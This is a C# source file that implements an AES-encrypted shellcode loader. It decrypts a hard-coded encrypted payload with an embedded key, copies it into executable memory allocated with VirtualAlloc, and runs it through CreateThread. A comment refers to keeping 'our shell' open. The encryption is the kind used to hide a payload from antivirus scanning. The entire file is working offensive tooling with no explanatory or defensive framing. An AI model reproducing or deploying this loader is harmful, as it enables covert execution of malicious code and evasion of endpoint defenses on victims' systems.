using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
namespace ShellcodeCSAES
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static byte[]  Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;

                // Keep this in mind when you view your decrypted content as the size will likely be different.
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

            public static    byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }
        static void Main(string[] args)
        {

            Byte[] IV =
            { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
            Byte[] AESkey =
            { 0xd8, 0xd1, 0x86, 0x3c, 0xdc, 0xac, 0x14, 0xed, 0xc0, 0x38, 0x1a, 0x66, 0xb7, 0xed, 0xae, 0xa9 };
            Byte[] paylaod ={
0xa0, 0xe1, 0xa8, 0x25, 0xe3, 0x2e, 0x5a, 0xdb, 0x22, 0x34, 0x71, 0xd1, 0x26, 0xae, 0x10,
0x65, 0xa7, 0xbe, 0xd8, 0x2b, 0xa4, 0xf0, 0x75, 0xc1, 0x7d, 0x12, 0xb7, 0x64, 0x87, 0x8c,
0x58, 0x0a, 0xe8, 0x3a, 0x3f, 0x12, 0xa4, 0x40, 0xaa, 0x63, 0x88, 0xc6, 0x7a, 0xa2, 0xec,
0xf9, 0x56, 0xf5, 0x01, 0xfd, 0x84, 0x43, 0x38, 0xc9, 0x3c, 0x5c, 0x6a, 0x42, 0xd1, 0x1f,
0x90, 0xce, 0xa9, 0xd2, 0x0f, 0xe1, 0xe2, 0x69, 0x14, 0x75, 0xcb, 0x79, 0x6e, 0xa7, 0x2a,
0x1b, 0xdd, 0x66, 0xc9, 0x93, 0x5c, 0x1b, 0xd5, 0xca, 0x7c, 0x40, 0x71, 0x1a, 0xdb, 0x42,
0x82, 0xca, 0xd4, 0x7c, 0x05, 0x11, 0x79, 0x3a, 0x0b, 0x2e, 0x2a, 0xa7, 0xba, 0x14, 0xea,
0xea, 0x09, 0xd6, 0x47, 0x1e, 0x3b, 0x7a, 0x39, 0x67, 0xd2, 0xab, 0x1b, 0xa4, 0x1e, 0x23,
0x5b, 0xd6, 0xec, 0x2f, 0xf9, 0x00, 0xfa, 0xf8, 0xd0, 0xac, 0x69, 0xfe, 0x57, 0xc1, 0xbc,
0xab, 0x5e, 0x66, 0x3a, 0x4c, 0x4f, 0x80, 0xe7, 0xac, 0x6e, 0x28, 0x91, 0x70, 0x5d, 0xd1,
0x4b, 0x34, 0xb2, 0xe2, 0xdd, 0xd9, 0x52, 0x09, 0x56, 0x6b, 0x1a, 0x77, 0x67, 0x8d, 0x04,
0xa3, 0x67, 0x56, 0x0f, 0x71, 0x07, 0x12, 0xa7, 0x6e, 0x19, 0x9e, 0x4c, 0x97, 0x51, 0xce,
0x4d, 0x82, 0x7f, 0x7f, 0xb2, 0xa9, 0xca, 0xd3, 0x70, 0x71, 0x9d, 0x47, 0x8d, 0xa6, 0xd2,
0x50, 0xc0, 0xbe, 0x8a, 0xa2, 0x0b, 0x40, 0x5f, 0xa4, 0xf6, 0xc2, 0xfa, 0x13, 0xaa, 0x60,
0x0e, 0x14, 0x22, 0xc6, 0x3f, 0x30, 0x3a, 0xd2, 0x51, 0x94, 0x50, 0x07, 0x96, 0xc6, 0xa7,
0xce, 0xb1, 0x2f, 0xa9, 0xf9, 0x52, 0x2f, 0xc7, 0x53, 0x14, 0xe0, 0xa2, 0x06, 0x0d, 0x3b,
0xe0, 0xef, 0x93, 0x17, 0x21, 0xb3, 0x82, 0xc4, 0xc0, 0xa3, 0xe1, 0x00, 0x27, 0xee, 0x4c,
0xd4, 0xc3, 0xc3, 0xd1, 0x8d, 0xb4, 0x98, 0xfa, 0xf5, 0x08, 0x50, 0x73, 0x1f, 0xa0, 0x26,
0xee, 0x00, 0x12, 0x41, 0xed, 0x69, 0x62, 0xaa, 0x47, 0x27, 0x79, 0xae, 0x94, 0x50, 0x06,
0xe7, 0x54, 0x91, 0x83, 0xae, 0x6d, 0xdb, 0x82, 0x28, 0xa0, 0x20, 0x27, 0x38, 0x90, 0xd8,
0xd1, 0x7f, 0x1e, 0xc7 };
            byte[] ShellCode = Decrypt(paylaod, AESkey, IV);
            int size = ShellCode.Length;

            // Allocate our memory buffer
            IntPtr va = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Copy of decrypted shellcode into the buffer
            Marshal.Copy(ShellCode, 0, va, size);

            // Create a thread that contains our buffer
            IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);

            // Ensure our thread doesn't exit until we close our shell
            WaitForSingleObject(thread, 0xFFFFFFFF);

        }
    }
}
